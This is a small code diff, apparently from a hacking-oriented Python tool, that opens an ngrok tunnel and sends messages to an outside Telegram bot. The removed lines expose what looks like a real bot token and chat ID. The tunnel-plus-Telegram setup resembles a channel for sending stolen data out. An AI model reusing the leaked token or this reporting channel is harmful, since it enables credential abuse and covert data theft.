@@ -12,8 +12,8 @@ from pyngrok import ngrok
 from  getpass import  getuser
 public_url = ngrok.connect(8080)
 __autho__ = "youhacker55"
-bottoken = "5642428629:AAE_DjYtji8BNM3o4l-Yg1mlmWVwPZMYI9Y"
-chatid = "5741694043"
+bottoken = ""
+chatid = ""
 def sendtg(msg, bot, chatid):
     url = "https://api.telegram.org/bot" + bot + "/sendMessage?chat_id=" + chatid + "&text=" + msg
     requests.get(url)
